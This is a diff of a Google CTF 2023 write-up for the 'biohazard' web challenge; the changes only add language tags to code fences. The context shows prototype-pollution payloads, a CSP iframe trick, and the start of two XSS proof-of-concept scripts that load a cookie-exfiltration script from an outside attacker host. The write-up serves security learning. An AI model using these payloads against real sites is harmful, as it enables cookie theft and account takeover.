@@ -17,21 +17,21 @@ The hope was to maximize the potential of unintended solutions, so that all of u
 
 `Object.assign` is usually not vulnerable to Prototype Pollution, such as the following.
 
-```
+```js
 Object.assign({}, JSON.parse('{"__proto__":{"polluted": true}}'));
 console.log(Object.prototype.polluted); // undefined
 ```
 
 However, it is vulnerable when `Object.prototype` is passed in the first argument.
 
-```
+```js
 Object.assign(({})['__proto__'], JSON.parse('{"polluted": true}'));
 console.log(Object.prototype.polluted); // true
 ```
 
 And `main.js` has the same vulnerability.
 
-```
+```js
 interestObj = {"favorites":{}};
 const uuid = viewPath[1];
 const xhr = new XMLHttpRequest();
@@ -56,7 +56,7 @@ xhr.send();
 
 Therefore, if you send a JSON request which contains `__proto__` key to the `/create` endpoint, you can cause Prototype Pollution in the bio page.
 
-```
+```js
 fetch('/create', {
   method:'POST',
   headers: {
@@ -78,7 +78,7 @@ Now that we have Prototype Pollution and HTML injection (with arbitrary attribut
 
 In `bootstrap.js`, the `editor` variable looks suspicious.
 
-```
+```js
 if (!location.pathname.startsWith('/view/')) {
   ...
   editor = (x=>x)`/static/editor.js`;
@@ -87,7 +87,7 @@ if (!location.pathname.startsWith('/view/')) {
 
 This `editor` variable is used in `main.js` to include additional script.
 
-```
+```js
 import {safeScriptEl} from 'safevalues/dom';
 
 ...
@@ -110,7 +110,7 @@ If we can overwrite the `editor` attribute, we can trigger an XSS!
 
 If you take a look at the Closure sanitizer config, you will notice that `<iframe>` is specifically allowed.
 
-```
+```js
 var Const = goog.string.Const;
 var unsafe = goog.html.sanitizer.unsafe;
 var builder = new goog.html.sanitizer.HtmlSanitizer.Builder();
@@ -129,7 +129,7 @@ sanitizer = unsafe.alsoAllowAttributes(
 
 You can use the `csp` attribute in iframe to block certain resources inside iframe (using CSP), if the page inside iframe is same-origin as parent (similar to the [XSS Auditor](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection#:~:text=This%20code%20is,unsafe%20debug%20code.) primitive). Therefore, you can block `bootstrap.js` from loading.
 
-```
+```html
 <iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
 ```
 
@@ -146,7 +146,7 @@ Here are the PoCs for creating XSS bio, by running script in the challenge page.
 
 DOM clobbering:
 
-```
+```js
 // https://biohazard-web.2023.ctfcompetition.com
 const challengeOrigin = window.origin;
 const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';
@@ -174,7 +174,7 @@ location.href = `/view/${secondBio.id}`;
 
 Prototype Pollution:
 
-```
+```js
 // https://biohazard-web.2023.ctfcompetition.com
 const challengeOrigin = window.origin;
 const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';
